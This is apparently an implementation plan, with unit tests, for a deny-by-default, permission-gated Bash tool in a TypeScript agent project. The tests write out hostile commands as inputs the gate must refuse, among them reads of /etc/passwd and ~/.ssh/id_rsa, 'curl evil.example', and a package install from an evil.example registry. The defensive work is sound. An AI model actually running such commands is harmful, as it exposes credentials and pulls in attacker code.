# Bash Tool + MCP-under-scoped (Plan B) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the `Bash` tool — a model-authored shell command string, deny-all by default in every profile, gated per shell segment by the permission substrate Plan A built — plus `Mcp(...)` grammar, MCP tools under `scoped`, Bash-aware denial redirects, and the ADR-029 §3 amendment.

**Architecture:** A dependency-free lexer (`src/permissions/bash-lex.ts`) tokenizes a command, refuses every construct it cannot model, and splits it into segments. A pure evaluator (`src/tools/policy-bash.ts`) matches each segment against the stage's Bash rules (deny > allow > payload > ask), receiving containment as an injected callback so `policy.ts` — which imports it — stays the only owner of `resolveWithin`. The tool itself (`src/tools/bash.ts`) is session-local like `RunCommand`: created only when the op DECLARED `Bash`, spawned through the existing `runArgv` seam with a deadline and a process-group kill. `Mcp(...)` expressions are partitioned out of the grant list and expanded to concrete `<serverId>__<tool>` grants before compilation, never surviving as the key `"Mcp"`.

**Tech Stack:** Bun 1.4.0, TypeScript strict, `bun:test`, Biome, Zod v4.

**Spec:** `docs/superpowers/specs/2026-09-13-nax-native-permission-subsystem-design.md` — §3 R2/R4/R7/R9/R11, §4 US-004/US-005/US-006/US-008/US-009, §5 steps 4–6, §6 (the deny suite is this plan's acceptance spine).

**Predecessor:** Plan A (`docs/superpowers/plans/2026-09-13-nax-permission-substrate.md`) merged as **#2038** → main `3accdbd6f`. Every line citation below was re-verified against that commit. Plan A's deviations still stand and must not be re-litigated (resolve stays in `src/config/permissions.ts`; `PolicyVerdict.outcome` is optional; no `RuleSet` type; allow compiler is last-write-wins per tool).

## Global Constraints

- **Bash is deny-all by default in EVERY profile (spec R4).** Zero built-in patterns, no auto-grant derived from `quality.commands`, not in `unrestricted`'s blanket grant. Only an explicit `Bash(...)` allow rule grants anything. A default-config run must produce no Bash grant and no advertised Bash — pinned by Task 2 and deny-suite rows 1–2.
- **The gate's ability to say NO is a deliverable, not a side effect (spec R9, ADR-029 §3's standing bar).** A green build in which no test demonstrates a refusal is a failed build of this feature. Task 8's deny suite covers all 11 rows of spec §6.
- **Safe-by-refusal, not safe-by-sandbox.** Anything the lexer cannot see through is denied with a reason naming the construct. No OS-level sandboxing (spec §7); the ADR amendment says so explicitly.
- **`quality.commands` / `acceptance.command` are never wrapped, gated, or rewritten (spec R8 / rtk R10).** They are trusted project config. This plan only reads `quality.shell` and `quality.stripEnvVars` as the shell and env-strip list for Bash.
- **Op declarations stay in code (spec R5).** Config never widens `op.tools`. Review ops (adversarial, semantic, debate) do not declare `Bash` in v1, and neither does the **verifier** (user ruling, 2026-09-14 — see Deviation 10 and Task 5).
- Bun-native only (`Bun.file`, `Bun.spawn`, `Bun.sleep`); no Node `fs`/`child_process` in `src/`. Spawning goes through `runArgv` (`src/utils/argv-exec.ts`), never a fresh `spawn`.
- New `src/` files: ≤600 lines, ≥0.8 per-file coverage (`bun run test:coverage` is a SEPARATE gate — run it explicitly). Test files ≤800 lines.
- Every directory with 2+ exports gets a barrel; `src/` imports barrels only (`check:alias-internals`); tests may reach internals via `@/...`.
- `src/permissions/` must never VALUE-import `@/tools` (Plan A Task 1): the edge runs the other way (`src/tools/runtime.ts` imports `@/permissions`). Type-only imports are fine — `check:import-cycles` excludes type-only edges.
- `as never` is lint-banned repo-wide; `as unknown as` in `test/` fails the `check:test-as-unknown-as` ratchet — build configs with `makeNaxConfig(DeepPartial)` from `@test/helpers` (idiom: `test/unit/permissions/substrate-equivalence.test.ts:1-9`).
- No fixed-duration sleeps in tests; no `mock.module()` — `_deps` injection only (`_bashToolDeps` here).
- Permission-mode literals (`"approve-all"`/`"approve-reads"`) outside `src/config/permissions.ts` need `// nax-permission-mode-allow: <reason>` (enforced by `scripts/check-permission-mode-ssot.ts`).
- **`bun run lint` does NOT run `check:permission-mode-ssot`, `check:test-as-unknown-as`, or `check:rules-drift`.** Only `bun run check:all` does, which is what CI runs. Run `check:all` before claiming green.
- Conventional commits; one concern per commit. **Never `git push`** — a code review runs before push/PR (standing user ruling).

**Deviations from the spec (deliberate — record ALL of these in the PR):**

1. **(US-005) The evaluator lives in `src/tools/policy-bash.ts`, not `src/permissions/bash-rules.ts`.** Segment matching needs `compileArgvPattern`/`CompiledEntry` (`src/tools/policy-match.ts`), `deniedFlag` (`src/tools/exec-guard.ts`) and containment (`resolveWithin`, `src/tools/policy.ts`) — all value imports from `src/tools`, which `src/permissions` may not make. What DOES live in `src/permissions/` is the half that needs nothing: `bash-lex.ts`, the tokenizer/segmenter and the unanalysable-construct refusals, unit-testable without spawning or resolving anything (the spec's actual requirement in US-005.5).
2. **(US-005) Containment is injected, not imported.** `policy.ts` imports `policy-bash.ts`, so `policy-bash.ts` cannot import `policy.ts` back. `checkBashCommand` takes `resolvePath: (candidate) => string | null`, which `policy.ts` supplies as `resolveWithin(root, candidate, execTouchedPaths)`. The `.git/` refusal and the `execTouchedPaths` carve-out therefore apply unchanged, from their single owner.
3. **(US-005.3) A TRAILING `*` in a Bash pattern is OPTIONAL.** The spec requires `Bash(bun test *)` to admit bare `bun test` as well as `bun test src/x.test.ts`. `matchesArgvPattern` (Exec's matcher) requires `argv.length >= tokens.length`, so it would refuse the bare form. Bash gets its own `matchesTokens`, which drops one trailing `*` before the prefix compare. Both forms are pinned by tests; Exec's matcher is untouched.
4. **(US-004 prompting) The "prefer structured tools" guidance rides in the Bash tool's `description`, not in `src/agents/tool-preamble.ts`.** On the native path `promptWithToolPreamble` returns `options.prompt` verbatim (`src/agents/tool-preamble.ts:26-29`) — the ACP catalogue preamble is deliberately not rendered, so there is no native text channel to add a line to. A tool's own description IS the native channel, and it is the one the model sees per call.
5. **(US-006) `resolvePermissions` gains `providerScope?: "all" | "rules" | "none"` rather than coding-tool-support reading the profile.** `scoped` and `safe` both resolve to mode `approve-reads`, so the live gate (`resolved.mode === "approve-all"`, `src/agents/coding-tool-support.ts:300`) cannot tell them apart — and R7 says `scoped` gets providers while `safe` gets none. Deciding that in the SSOT keeps the permission decision where `check:permission-mode-ssot` expects it; the consumer just reads the answer.
6. **(US-006) `resolveProviderTools` gains an `admits` predicate and returns `entries`.** Filtering by `Mcp(server:tool)` and expanding deny/ask rules both need `(providerId, localName)` pairs, and `src/tools/provider-adapt.ts:1-7` forbids parsing `<id>__<local>` back apart. The pairs already exist inside `resolveProviderTools` as its local `entries` array; this exposes them instead of re-deriving them by string surgery.
7. **(US-005 lexer) `2>&1`, `&>`, here-docs and substitutions are all REFUSED with construct-naming reasons.** The spec only names substitutions and here-docs; fd duplication and `&>` are the same class (a shape the lexer does not model), and a named refusal teaches where a generic parse failure would not. Redirections `>`, `>>`, `<` and `2>file` are supported and containment-checked, per R11.
8. **(§6 rows 1 + 11) The Bash tool is CONSTRUCTED on declaration and GATED on the grant — two different lines.** Row 11 wants an undeclared Bash unreachable; row 1 wants an ungranted Bash denied *with a redirect*. Those pull opposite ways, because `callTool` resolves a name before it consults advertisement: gating construction on the grant satisfies row 11 but turns row 1 into a bare "unknown tool" with no affordance, and gating on neither breaks row 11. So construction is gated on `args.declared.includes("Bash")` alone; the missing grant then denies inside `policy.check`, where the redirect is computed, and `grantedTools()` still withholds the tool from `advertised()` so it costs no prompt bytes. Both rows are pinned by tests (Task 4 Step 1, Task 8 rows 1/2/11).
9. **(US-008) `denied:ask` needs no code change.** Plan A already composes `${verdict.reason} -- ${ASK_UNAVAILABLE_REASON}` (`src/tools/runtime.ts`), and the reason names the matched rule. Task 7 pins that message with a test rather than rewriting it.
10. **(US-004 ceiling) The verifier does NOT declare `Bash`** — user ruling, 2026-09-14, overriding the spec's US-004 list. `verify.ts` carries no `Exec` precisely so a verifier cannot install packages while judging the implementer's work; a `Bash(...)` rule covering `bun add *` hands that ability straight back, and a wider one at that. Nine fix-shaped ops declare it. The verifier is pinned NEGATIVE in Task 5's test, beside the review ops, so re-adding it takes a deliberate test change. Reopen only if a real verify-stage need appears that no declared command can express — the same bar ADR-029 §3 set for the shell itself.

---

### Task 1: `src/permissions/bash-lex.ts` — tokenizer, segmenter, refusals

**Files:**
- Create: `src/permissions/bash-lex.ts`
- Modify: `src/permissions/index.ts` (barrel: add the four exports)
- Test: `test/unit/permissions/bash-lex.test.ts`

**Interfaces:**
- Consumes: nothing. This file has ZERO imports — that is what keeps `src/permissions` free of value edges into `src/tools` (Global Constraints).
- Produces (Task 3 and Task 7 rely on these exact names):
  - `interface BashToken { readonly text: string; readonly opaque: boolean }`
  - `interface BashRedirect { readonly operator: string; readonly target: string; readonly opaque: boolean }`
  - `interface BashSegment { readonly tokens: readonly BashToken[]; readonly redirects: readonly BashRedirect[] }`
  - `type BashLexResult = { readonly kind: "ok"; readonly segments: readonly BashSegment[] } | { readonly kind: "refused"; readonly construct: string }`
  - `function lexBashCommand(command: string): BashLexResult`

- [ ] **Step 1: Write the failing test**

`test/unit/permissions/bash-lex.test.ts`:

```typescript
import { describe, expect, test } from "bun:test";
import { lexBashCommand } from "@/permissions";

function segmentsOf(command: string): readonly string[][] {
  const result = lexBashCommand(command);
  if (result.kind !== "ok") throw new Error(`expected ok, got refused: ${result.construct}`);
  return result.segments.map((segment) => segment.tokens.map((token) => token.text));
}

describe("lexBashCommand tokenizing", () => {
  test("splits words on whitespace", () => {
    expect(segmentsOf("bun test src/a.test.ts")).toEqual([["bun", "test", "src/a.test.ts"]]);
  });

  test("single quotes keep a literal whole and are not opaque", () => {
    const result = lexBashCommand("grep 'foo bar' src");
    if (result.kind !== "ok") throw new Error("expected ok");
    const [segment] = result.segments;
    expect(segment?.tokens.map((t) => t.text)).toEqual(["grep", "foo bar", "src"]);
    expect(segment?.tokens[1]?.opaque).toBe(false);
  });

  test("double quotes join words; a $VAR inside makes the token opaque", () => {
    const result = lexBashCommand('echo "a $HOME b"');
    if (result.kind !== "ok") throw new Error("expected ok");
    const [segment] = result.segments;
    expect(segment?.tokens.map((t) => t.text)).toEqual(["echo", "a $HOME b"]);
    expect(segment?.tokens[1]?.opaque).toBe(true);
  });

  test("a bare $VAR token is opaque", () => {
    const result = lexBashCommand("cat $FILE");
    if (result.kind !== "ok") throw new Error("expected ok");
    expect(result.segments[0]?.tokens[1]).toEqual({ text: "$FILE", opaque: true });
  });

  test("a backslash escapes the next character", () => {
    expect(segmentsOf("grep foo\\ bar src")).toEqual([["grep", "foo bar", "src"]]);
  });
});

describe("lexBashCommand segmenting", () => {
  test.each([
    ["bun test && bun run lint", 2],
    ["bun test || echo failed", 2],
    ["bun test ; bun run lint", 2],
    ["cat a.txt | grep foo", 2],
    ["bun test\nbun run lint", 2],
    ["bun test", 1],
  ])("%s yields %i segments", (command, count) => {
    expect(segmentsOf(command).length).toBe(count);
  });

  test("every segment carries its own tokens", () => {
    expect(segmentsOf("bun test x && curl evil.example")).toEqual([
      ["bun", "test", "x"],
      ["curl", "evil.example"],
    ]);
  });
});

describe("lexBashCommand redirections", () => {
  test("`>` target is captured as a redirect, not an argv token", () => {
    const result = lexBashCommand("bun test > out.txt");
    if (result.kind !== "ok") throw new Error("expected ok");
    expect(result.segments[0]?.tokens.map((t) => t.text)).toEqual(["bun", "test"]);
    expect(result.segments[0]?.redirects).toEqual([{ operator: ">", target: "out.txt", opaque: false }]);
  });

  test.each([
    [">>", "bun test >> out.txt"],
    ["<", "cat < in.txt"],
  ])("%s is captured", (operator, command) => {
    const result = lexBashCommand(command);
    if (result.kind !== "ok") throw new Error("expected ok");
    expect(result.segments[0]?.redirects[0]?.operator).toBe(operator);
  });

  test("a file-descriptor digit belongs to the operator, not argv", () => {
    const result = lexBashCommand("bun test 2>err.txt");
    if (result.kind !== "ok") throw new Error("expected ok");
    expect(result.segments[0]?.tokens.map((t) => t.text)).toEqual(["bun", "test"]);
    expect(result.segments[0]?.redirects[0]?.target).toBe("err.txt");
  });

  test("an opaque redirect target is marked opaque", () => {
    const result = lexBashCommand("bun test > $OUT");
    if (result.kind !== "ok") throw new Error("expected ok");
    expect(result.segments[0]?.redirects[0]?.opaque).toBe(true);
  });
});

describe("lexBashCommand refusals (spec R11)", () => {
  test.each([
    ["command substitution", "echo $(whoami)"],
    ["command substitution inside double quotes", 'echo "$(whoami)"'],
    ["backtick", "echo `whoami`"],
    ["process substitution", "diff <(a) <(b)"],
    ["here-document", "cat <<EOF"],
    ["fd duplication", "bun test 2>&1"],
    ["&> form", "bun test &> out.txt"],
    ["unbalanced single quote", "grep 'foo"],
    ["unbalanced double quote", 'grep "foo'],
    ["trailing backslash", "bun test \\"],
    ["empty command", "   "],
    ["dangling operator", "bun test &&"],
    ["redirect with no target", "bun test >"],
  ])("refuses %s", (_label, command) => {
    const result = lexBashCommand(command);
    expect(result.kind).toBe("refused");
    if (result.kind === "refused") expect(result.construct.length).toBeGreaterThan(0);
  });

  test("names the construct it refused", () => {
    const result = lexBashCommand("echo $(whoami)");
    if (result.kind !== "refused") throw new Error("expected refused");
    expect(result.construct).toContain("$(");
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test test/unit/permissions/bash-lex.test.ts`
Expected: FAIL — `lexBashCommand` is not exported from `@/permissions`.

- [ ] **Step 3: Write the implementation**

`src/permissions/bash-lex.ts`:

```typescript
/**
 * Lexer and segmenter for a model-authored Bash command (spec §4 US-005.1-2).
 *
 * Safe-by-refusal, not safe-by-sandbox: any construct this lexer does not
 * MODEL is refused by name, because a payload the gate cannot read is a
 * payload no shell gets (spec R11). That is a deliberately small language —
 * words, quotes, operators, simple redirections — and growing it is a
 * permission decision, not a parser improvement.
 *
 * ZERO imports, on purpose. `src/permissions` must not value-import
 * `@/tools` (the edge runs the other way: src/tools/runtime.ts imports this
 * package), and a lexer that needs nothing is also a lexer that can be tested
 * without a filesystem, a policy or a spawn.
 */

/** One word of a segment. `opaque` means it contained `$`-expansion, so its
 * RUNTIME value is unknown here: it can never satisfy a containment check and
 * can only be matched by a bare `*` rule token (see policy-bash.ts). */
export interface BashToken {
  readonly text: string;
  readonly opaque: boolean;
}

/** A simple redirection. The target is containment-checked by the caller. */
export interface BashRedirect {
  readonly operator: string;
  readonly target: string;
  readonly opaque: boolean;
}

/** One command between control operators. */
export interface BashSegment {
  readonly tokens: readonly BashToken[];
  readonly redirects: readonly BashRedirect[];
}

export type BashLexResult =
  | { readonly kind: "ok"; readonly segments: readonly BashSegment[] }
  | { readonly kind: "refused"; readonly construct: string };

function refused(construct: string): BashLexResult {
  return { kind: "refused", construct };
}

/** End index of a double-quoted run starting at `from`, honouring backslash
 * escapes, or -1 when the quote is never closed. */
function doubleQuoteEnd(command: string, from: number): number {
  for (let i = from; i < command.length; i += 1) {
    const char = command[i];
    if (char === "\\") {
      i += 1;
      continue;
    }
    if (char === '"') return i;
  }
  return -1;
}

export function lexBashCommand(command: string): BashLexResult {
  // Checked up front so the reason names the real problem. Leaving it to the
  // final flushSegment() would report "an empty command segment", which is
  // true and useless.
  if (command.trim() === "") return refused("an empty command");

  const segments: BashSegment[] = [];
  let tokens: BashToken[] = [];
  let redirects: BashRedirect[] = [];
  let word = "";
  let opaque = false;
  let started = false;
  let pendingRedirect: string | undefined;

  function flushWord(): void {
    if (!started) return;
    if (pendingRedirect !== undefined) {
      redirects.push({ operator: pendingRedirect, target: word, opaque });
      pendingRedirect = undefined;
    } else {
      tokens.push({ text: word, opaque });
    }
    word = "";
    opaque = false;
    started = false;
  }

  /** Closes a segment, or names why it cannot be closed. A dangling operator
   * leaves an empty segment, which is refused rather than silently dropped:
   * `bun test &&` is a truncated command, and guessing at intent here would
   * approve something nobody wrote. */
  function flushSegment(): string | undefined {
    flushWord();
    if (pendingRedirect !== undefined) return "a redirection with no target";
    if (tokens.length === 0 && redirects.length === 0) return "an empty command segment";
    segments.push({ tokens, redirects });
    tokens = [];
    redirects = [];
    return undefined;
  }

  let i = 0;
  while (i < command.length) {
    const char = command[i] as string;
    const next = command[i + 1];

    if (char === "'") {
      const end = command.indexOf("'", i + 1);
      if (end === -1) return refused("an unbalanced single quote");
      // Single quotes suppress every expansion, so the content stays literal
      // and the token stays analysable.
      word += command.slice(i + 1, end);
      started = true;
      i = end + 1;
      continue;
    }

    if (char === '"') {
      const end = doubleQuoteEnd(command, i + 1);
      if (end === -1) return refused("an unbalanced double quote");
      const inner = command.slice(i + 1, end);
      if (inner.includes("$(")) return refused("a command substitution `$(...)`");
      if (inner.includes("`")) return refused("a backtick command substitution");
      if (inner.includes("$")) opaque = true;
      word += inner;
      started = true;
      i = end + 1;
      continue;
    }

    if (char === "\\") {
      if (next === undefined) return refused("a trailing backslash");
      word += next;
      started = true;
      i += 2;
      continue;
    }

    if (char === "$" && next === "(") return refused("a command substitution `$(...)`");
    if (char === "`") return refused("a backtick command substitution");
    if ((char === "<" || char === ">") && next === "(") {
      return refused("a process substitution `<(...)` / `>(...)`");
    }
    if (char === "<" && next === "<") return refused("a here-document `<<`");
    if ((char === "<" || char === ">") && next === "&") {
      return refused("file-descriptor duplication (`2>&1`)");
    }
    if (char === "&" && next === ">") return refused("the `&>` redirection form");

    if (char === "$") {
      opaque = true;
      word += char;
      started = true;
      i += 1;
      continue;
    }

    if (char === " " || char === "\t" || char === "\r") {
      flushWord();
      i += 1;
      continue;
    }

    if (char === "\n" || char === ";") {
      const error = flushSegment();
      if (error !== undefined) return refused(error);
      i += 1;
      continue;
    }
    if ((char === "&" && next === "&") || (char === "|" && next === "|")) {
      const error = flushSegment();
      if (error !== undefined) return refused(error);
      i += 2;
      continue;
    }
    if (char === "|" || char === "&") {
      const error = flushSegment();
      if (error !== undefined) return refused(error);
      i += 1;
      continue;
    }

    if (char === ">" || char === "<") {
      // A bare fd digit belongs to the operator (`2>err.txt`), not to argv:
      // left in the token list it would have to satisfy an allow rule, and
      // `Bash(bun test *)` would refuse a command it plainly covers.
      if (/^\d$/.test(word)) {
        word = "";
        started = false;
      }
      flushWord();
      let operator = char;
      if (char === ">" && next === ">") {
        operator = ">>";
        i += 1;
      }
      pendingRedirect = operator;
      i += 1;
      continue;
    }

    word += char;
    started = true;
    i += 1;
  }

  const error = flushSegment();
  if (error !== undefined) return refused(error);
  return { kind: "ok", segments };
}
```

`src/permissions/index.ts` — add the barrel line (keep the file alphabetically ordered as Biome enforces):

```typescript
export { ASK_UNAVAILABLE_REASON, headlessAskResolver } from "./ask";
export type { BashLexResult, BashRedirect, BashSegment, BashToken } from "./bash-lex";
export { lexBashCommand } from "./bash-lex";
export { parseRuleList, parseToolExpression } from "./grammar";
export type { AskRequest, AskResolver } from "./types";
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `bun test test/unit/permissions/bash-lex.test.ts`
Expected: PASS (every case).

- [ ] **Step 5: Lint and typecheck**

Run: `bun run lint:biome && bun run typecheck`
Expected: clean. If Biome reorders the barrel, accept its ordering.

- [ ] **Step 6: Commit**

```bash
git add src/permissions/bash-lex.ts src/permissions/index.ts test/unit/permissions/bash-lex.test.ts
git commit -m "feat(permissions): Bash command lexer with construct refusals"
```

---

### Task 2: `Bash` identity, and no grant for it anywhere by default

**Files:**
- Modify: `src/tools/types.ts` (add `"Bash"` to `CodingToolName`; export `BASH_TOOL_NAME`)
- Modify: `src/tools/registry.ts:87-99` (add `"Bash"` to `RESERVED_TOOL_NAMES`)
- Modify: `src/tools/index.ts` (export `BASH_TOOL_NAME`)
- Modify: `src/config/permissions.ts:120-141` (comment only: why `Bash` is absent from every profile's grant list)
- Test: `test/unit/permissions/bash-default-deny.test.ts`

**Interfaces:**
- Consumes: `RESERVED_TOOL_NAMES` (`src/tools/registry.ts:87`) — the known-name set `validateToolExpression` uses (`src/config/config-guards.ts:349`), so adding `"Bash"` there is what makes `Bash(...)` load-legal. No config-guards edit is needed for `Bash`.
- Produces: `const BASH_TOOL_NAME = "Bash"` (Tasks 3–7 import it from `@/tools`).

- [ ] **Step 1: Write the failing test**

`test/unit/permissions/bash-default-deny.test.ts`:

```typescript
import { describe, expect, test } from "bun:test";
import { makeNaxConfig } from "@test/helpers";
import { validatePermissionsBlock } from "@/config/config-guards";
import { resolvePermissions } from "@/config/permissions";
import { BASH_TOOL_NAME } from "@/tools";

const cfg = (execution: Record<string, unknown>) => makeNaxConfig({ execution });

describe("Bash is deny-all by default (spec R4)", () => {
  test.each(["unrestricted", "safe", "scoped"] as const)("%s grants no Bash", (permissionProfile) => {
    const resolved = resolvePermissions(cfg({ permissionProfile }), "run");
    expect((resolved.toolGrants ?? []).some((grant) => grant.tool === BASH_TOOL_NAME)).toBe(false);
  });

  test("an unset profile (the documented default) grants no Bash", () => {
    const resolved = resolvePermissions(cfg({}), "run");
    expect((resolved.toolGrants ?? []).some((grant) => grant.tool === BASH_TOOL_NAME)).toBe(false);
  });

  test("an explicit allow rule is the only way to grant it", () => {
    const resolved = resolvePermissions(
      cfg({ permissionProfile: "unrestricted", permissions: { run: { allow: ["Bash(bun test *)"] } } }),
      "run",
    );
    expect((resolved.toolGrants ?? []).filter((grant) => grant.tool === BASH_TOOL_NAME)).toEqual([
      { tool: "Bash", patterns: ["bun test *"] },
    ]);
  });

  test("Bash expressions are load-legal in every rule list", () => {
    expect(() =>
      validatePermissionsBlock({
        execution: {
          permissions: {
            run: { allow: ["Bash(bun test *)"], deny: ["Bash(git push *)"], ask: ["Bash(rm *)"] },
          },
        },
      }),
    ).not.toThrow();
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test test/unit/permissions/bash-default-deny.test.ts`
Expected: FAIL — `BASH_TOOL_NAME` is not exported, and `validatePermissionsBlock` throws `CONFIG_PERMISSIONS_UNKNOWN_TOOL` for `Bash`.

- [ ] **Step 3: Write the implementation**

In `src/tools/types.ts`, beside `EXEC_TOOL_NAME`:

```typescript
/**
 * Policy identity of the model-authored shell tool.
 *
 * Unlike `Exec`, `Bash` IS a registered tool — but a session-local one
 * (`createBashTool`), because it needs the project's shell and env-strip list.
 * Reserved (`RESERVED_TOOL_NAMES`) so no third party can register a tool that
 * shadows the identity the policy gates.
 */
export const BASH_TOOL_NAME = "Bash";
```

Add `| "Bash"` to the `CodingToolName` union (after `"Exec"`), add `"Bash"` to `RESERVED_TOOL_NAMES` in `src/tools/registry.ts`, and export `BASH_TOOL_NAME` from `src/tools/index.ts` alongside `EXEC_TOOL_NAME`:

```typescript
export { BASH_TOOL_NAME, EXEC_TOOL_NAME } from "./types";
```

In `src/config/permissions.ts`, above `unconditionalGrants` (line 139 on `3accdbd6f`; `BUILT_IN_EXEC_PATTERNS` ends at :136), add the comment that makes the absence deliberate rather than accidental:

```typescript
/**
 * Grants for a profile that imposes no per-stage policy.
 *
 * `Bash` is deliberately absent from every caller's tool list below, and has
 * no built-in pattern list of its own (spec R4). `Exec` is excluded from the
 * blanket `["*"]` and given BUILT_IN_EXEC_PATTERNS instead; Bash goes one
 * further and is granted NOTHING anywhere — not under `unrestricted`, not
 * derived from `quality.commands`. A model-authored shell command runs only
 * where a human wrote a `Bash(...)` allow rule, which is the whole of
 * ADR-029 §3's bargain. Adding "Bash" to any list here breaks that bargain
 * and the deny suite (`test/integration/permissions/bash-deny-suite.test.ts`)
 * fails on purpose if anyone does.
 */
function unconditionalGrants(tools: readonly string[]): ToolGrant[] {
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `bun test test/unit/permissions/bash-default-deny.test.ts && bun test test/unit/tools/registry.test.ts`
Expected: PASS.

- [ ] **Step 5: Check nothing else asserted the closed tool set**

Run: `bun test test/unit/config/ test/unit/tools/ test/unit/operations/`
Expected: PASS. If a test enumerated `RESERVED_TOOL_NAMES` or `CodingToolName` exhaustively, add `Bash` to that expectation — do not narrow the union back.

- [ ] **Step 6: Commit**

```bash
git add src/tools/types.ts src/tools/registry.ts src/tools/index.ts src/config/permissions.ts test/unit/permissions/bash-default-deny.test.ts
git commit -m "feat(tools): reserve the Bash identity, granted by nothing by default"
```

---

### Task 3: `src/tools/policy-bash.ts` — per-segment evaluation, wired into `policy.check`

**Files:**
- Create: `src/tools/policy-bash.ts`
- Modify: `src/tools/types.ts` (`ToolScope.commandField`)
- Modify: `src/tools/policy.ts` (import, `isFieldlessScope` at :139, `commandBranch`, the `check()` branch chain at :516-520)
- Test: `test/unit/tools/policy-bash.test.ts`

**Interfaces:**
- Consumes: `lexBashCommand`/`BashSegment`/`BashToken` from `@/permissions` (Task 1); `compileArgvPattern`, `CompiledEntry`, `CompiledPattern` from `./policy-match`; `deniedFlag` from `./exec-guard`; `BASH_TOOL_NAME` from `./types` (Task 2).
- Produces (consumed only by `policy.ts` and tests):
  - `type BashCheck = { kind: "allow" } | { kind: "ask"; rule: string } | { kind: "deny"; reason: string; breach: boolean }`
  - `function checkBashCommand(args: { tool: string; command: unknown; grant: CompiledEntry; denyEntry?: CompiledEntry; askEntry?: CompiledEntry; resolvePath: (candidate: string) => string | null }): BashCheck`

- [ ] **Step 1: Write the failing test**

`test/unit/tools/policy-bash.test.ts`:

```typescript
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import { compileToolPolicy } from "@/tools";

const BASH_SCOPE = { pathFields: [], commandField: "command" } as const;

let root: string;

beforeEach(() => {
  root = makeTempDir("policy-bash-");
  writeFileSync(join(root, "file.txt"), "x");
});

afterEach(() => {
  cleanupTempDir(root);
});

function policyFor(patterns: readonly string[], options?: { deny?: readonly string[]; ask?: readonly string[] }) {
  return compileToolPolicy([{ tool: "Bash", patterns }], root, {
    ...(options?.deny !== undefined ? { denyRules: [{ tool: "Bash", patterns: options.deny }] } : {}),
    ...(options?.ask !== undefined ? { askRules: [{ tool: "Bash", patterns: options.ask }] } : {}),
  });
}

const check = (policy: ReturnType<typeof policyFor>, command: string) =>
  policy.check("Bash", BASH_SCOPE, { command });

describe("granted commands run", () => {
  test("a trailing * is optional: the bare prefix is allowed (spec §4 US-005.3)", () => {
    const policy = policyFor(["bun test *"]);
    expect(check(policy, "bun test").allowed).toBe(true);
    expect(check(policy, "bun test src/a.test.ts").allowed).toBe(true);
  });

  test("prefix matching is token-wise, never substring", () => {
    expect(check(policyFor(["bun test *"]), "bun testx").allowed).toBe(false);
  });

  test("every segment of a multi-segment command may be allowed", () => {
    const policy = policyFor(["bun test *", "bun run lint"]);
    expect(check(policy, "bun test && bun run lint").allowed).toBe(true);
  });

  test("a redirect inside the root is allowed", () => {
    expect(check(policyFor(["bun test *"]), "bun test > out.txt").allowed).toBe(true);
  });
});

describe("the deny suite rows this branch owns (spec §6)", () => {
  test("row 3: one unmatched segment denies the whole call", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test x && curl evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("curl evil.example");
  });

  test.each([
    ["command substitution", "bun test $(whoami)"],
    ["backtick", "bun test `whoami`"],
    ["here-document", "bun test <<EOF"],
  ])("row 4: %s is refused even under a granted prefix", (_label, command) => {
    const verdict = check(policyFor(["bun test *"]), command);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("cannot be analysed");
  });

  test("row 5: a path token outside the root denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat ../../etc/passwd");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 5: a path token inside .git/ denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat .git/config");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 6: a redirect target outside the root denies", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test > ../escape.txt");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
  });

  test("row 7: a DENIED_FLAGS-class flag denies under a granted prefix", () => {
    const verdict = check(policyFor(["bun add *"]), "bun add left-pad --registry https://evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("--registry");
  });

  test("row 8: deny beats allow", () => {
    const verdict = check(policyFor(["git *"], { deny: ["git push *"] }), "git push origin main");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("a `cd` outside the root is refused", () => {
    const verdict = check(policyFor(["cd *"]), "cd ../..");
    expect(verdict.allowed).toBe(false);
  });

  test("a `~`-prefixed token is refused (it depends on expansion this gate cannot see)", () => {
    expect(check(policyFor(["cat *"]), "cat ~/.ssh/id_rsa").allowed).toBe(false);
  });

  test("an opaque $VAR cannot satisfy a literal rule token", () => {
    expect(check(policyFor(["bun run $CMD"]), "bun run $CMD").allowed).toBe(false);
  });

  test("an empty command is refused", () => {
    expect(check(policyFor(["bun test *"]), "   ").allowed).toBe(false);
  });
});

describe("ask", () => {
  test("row 9 (policy half): an ask-matched granted command asks, naming the rule", () => {
    const verdict = check(policyFor(["rm *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.outcome).toBe("ask");
      expect(verdict.rule).toBe("Bash(rm *)");
    }
  });

  test("ask never grants: an UNGRANTED command that matches an ask rule is a plain denial", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("an unconditional ask rule does not short-circuit the command branch", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["*"] }), "bun test");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("ask");
  });

  test("an unconditional deny rule de-advertises Bash", () => {
